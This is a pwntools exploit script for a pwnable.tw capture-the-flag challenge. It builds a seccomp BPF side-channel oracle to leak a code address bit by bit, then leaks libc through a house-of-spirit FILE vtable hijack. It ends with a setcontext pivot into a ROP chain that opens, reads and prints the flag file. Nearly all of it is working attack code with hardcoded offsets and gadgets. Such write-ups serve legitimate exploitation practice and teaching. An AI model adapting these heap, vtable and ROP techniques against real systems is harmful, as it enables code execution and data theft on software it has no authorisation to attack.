###seccomp errno(0) behaviour + fopen + seccomp side channel(?) oracle
###This problem can also be done without gadgets from glibc(requires more careful use on vtable hijack to scanf/printf(format string attack)+stack pivoting)
###came up with this idea since the handed-out glibc is different from the one on server when i first tried to solve problem

from pwn import *
from SECCOMP_ASSEMBLER import *
from IO_FILE import *

###Structure
'''
    |       4       |       4       |
0x00|  syscall_num  |   0xc000003e  |
0x08|                               |
0x10|              arg0             |
0x18|              arg1             |
0x20|              arg2             |
0x28|              arg3             |
0x30|              arg4             |
0x38|              arg5             |
0x40|instruction_ptr|   return_val  |
0x48|       A       |       X       |
0x50|      mem0     |      mem1     |
0x58|      mem2     |      mem3     |
0x60|      mem4     |      mem5     |
0x68|      mem6     |      mem7     |
0x70|      mem8     |      mem9     |
0x78|     mem10     |     mem11     |
0x80|     mem12     |     mem13     |
0x88|     mem14     |     mem15     |
0x90|               |               |
'''
###Util
def create(Filter):
    r.sendlineafter('exit\n','0')
    r.sendlineafter('examples\n','0')
    r.sendlineafter('size?\n',str(len(Filter)))
    if len(Filter)<=0x1000 and len(Filter)&0x7==0:
        r.send(Filter)

def hijack_create(size,Filter,prefix=None,mode='probe'):
    r.sendlineafter('exit\n','0')
    r.sendlineafter('examples\n','1')
    r.sendlineafter('all\n','1')
    if mode=='probe':
        r.send(p16(size)+prefix)
        res = r.recvline(timeout=1)
        print(res)
        if res==b'' and Filter is not None:
            r.send(Filter)
            r.recvline(timeout=1)
            return 1
        else:
            return 0
    elif mode=='normal':
        r.send(p16(size))
        r.send(Filter)

def install():
    r.sendlineafter('exit\n','3')

###Addr
#  libc2.23
bss_offset = 0x204800
seccomp_filter_offset = 0x203080
puts_plt = 0xa70
main_arena_offset = 0x3c3b20
small_bin_offset = main_arena_offset+0x138

###ROPgadget
L_nop = 0x2058f
L_pop_rdi = 0x21102
L_pop_rsi = 0x202e8
L_pop_rdx = 0x1b92
L_pop_rax = 0x33544
L_syscall = 0x35426
setcontext_gadget = 0x47b75

###Exploit
r = remote('chall.pwnable.tw',10408)

seccomp_filter = BPFasm(f'''
                         loadA data[0]
                         jeq 2 1
                         jne 3 9
                         and 0
                         loadA len
                         jle 0 6
                         loadA data[0]
                         jne 2 3
                         loadA data[{0x10}]
                         and {0xfff}
                         jne {0x77c} 1
                         ret ERRNO(0)
                         ret ALLOW
                         ''')
create(seccomp_filter)
install()

###Oracle to leak second argument of read byte by byte
seccomp_filter_addr = 0x500000000080
for idx in range(0xc,0x2c):
    print(idx,(idx-0xc)//4)
    if idx%4==0:
        base_filter = BPFasm(f'''
                              loadA len
                              jeq 0 3
                              loadA data[{0x20}]
                              jne {0x2000+0x1000*((idx-0xc)//4)} 1
                              ret ERRNO({0xf000})
                              ret ALLOW
                              ''')
        create(base_filter)
        install()
    probe_filter = BPFasm(f'''
                           loadA len
                           jeq 0 10
                           loadA data[{0x20}]
                           jne {0x3000+0x1000*((idx-0xc)//4)} 8
                           loadA data[{0x18}]
                           and {0xfff}
                           jne {0x080+((idx-0xc)%4)} 5
                           loadA data[{0x38 if idx<0x20 else 0x3c}]
                           shr {idx%0x20}
                           and 1
                           jne 1 1
                           ret ERRNO({0xfff})
                           ret ALLOW
                           ''')
    create(probe_filter)
    install()
    if hijack_create(0x3000+0x1000*((idx-0xc)//4)+((idx-0xc)%4),'\n',mode='probe',prefix=b'\n'*((idx-0xc)%4))==0:
        seccomp_filter_addr|=1<<idx
code_base = seccomp_filter_addr-seccomp_filter_offset
print(hex(code_base))

###House of spirit+fclose vtable hijack to leak small bin address
###Since IO_IS_FILEBUF might be set on small bin address, IO_file_close_it might be called before IO_FINISH
###IO_file_close_it modifies IO_FILE->flag, but only after calling IO_CLOSE
###Thus assigning both finish/close entry of vtable results in 100% leak success
IO_file = IO_FILE_plus(arch=64)
stream = IO_file.construct(lock = code_base+seccomp_filter_offset,
                           vtable = code_base+seccomp_filter_offset)
IO_jump = IO_jump_t(arch=64)
vtable = IO_jump.construct(finish = code_base+puts_plt,
                           close = code_base+puts_plt)

payload = vtable.ljust(0x1000,b'\x00')+p64(code_base+seccomp_filter_offset+0x1020)+p64(0)+p64(0)+p64(0xf1)+stream.ljust(0xe8,b'\x00')+p64(0x21)+b'\x00'*0x18+p64(0x21)+b'\x00'*0x18+p64(0x21)
hijack_create(len(payload),payload,mode='normal')

payload = vtable.ljust(0x1000,b'\x00')+p64(code_base+seccomp_filter_offset+0x1020)+p64(0)+p64(0)+p64(0x111)
hijack_create(len(payload),payload,mode='normal')
small_bin_addr = u64(r.recvline()[:-1]+b'\x00\x00')
libc_base = small_bin_addr-small_bin_offset
print(hex(libc_base))

###hijack vtable one last time to perform ROPchain, execve to /bin/sh is not available here due to read size 0x2000~0x9000 being blocked by seccomp, this can be fixed by modifying oracle by a bit, but i'm currently too lazy to do that
stream = IO_file.construct(lock = code_base+seccomp_filter_offset+0x500,
                           vtable = code_base+seccomp_filter_offset+0x600)
stream = stream[:0xa0]+p64(code_base+bss_offset)+p64(libc_base+L_nop)+stream[0xb0:]
vtable = IO_jump.construct(finish = libc_base+setcontext_gadget)

ROPchain = p64(libc_base+L_pop_rdi)+p64(code_base+bss_offset+0xd8)+\
           p64(libc_base+L_pop_rsi)+p64(0)+\
           p64(libc_base+L_pop_rdx)+p64(0)+\
           p64(libc_base+L_pop_rax)+p64(2)+\
           p64(libc_base+L_syscall)+\
           p64(libc_base+L_pop_rdi)+p64(2)+\
           p64(libc_base+L_pop_rsi)+p64(code_base+bss_offset+0xd8)+\
           p64(libc_base+L_pop_rdx)+p64(0x100)+\
           p64(libc_base+L_pop_rax)+p64(0)+\
           p64(libc_base+L_syscall)+\
           p64(libc_base+L_pop_rdi)+p64(1)+\
           p64(libc_base+L_pop_rsi)+p64(code_base+bss_offset+0xd8)+\
           p64(libc_base+L_pop_rdx)+p64(0x100)+\
           p64(libc_base+L_pop_rax)+p64(1)+\
           p64(libc_base+L_syscall)

#argument = b'/proc/self/maps\x00'
argument = b'/home/seccomp-tools/flag\x00'

payload = ((stream.ljust(0x600,b'\x00')+vtable).ljust(0x1000,b'\x00')+p64(code_base+seccomp_filter_offset)).ljust(0x1780,b'\x00')+ROPchain+argument

hijack_create(len(payload),payload,mode='normal')
r.interactive()

###Reference
#  BPF document
#   https://www.kernel.org/doc/Documentation/networking/filter.txt
#  BPF operand source
#   https://code.woboq.org/linux/linux/tools/bpf/bpf_dbg.c.html
#  seccomp.c
#   https://code.woboq.org/linux/linux/kernel/seccomp.c.html
#  fclose
#   https://code.woboq.org/userspace/glibc/libio/iofclose.c.html
#  IO_file_close_it
#   https://code.woboq.org/userspace/glibc/libio/fileops.c.html
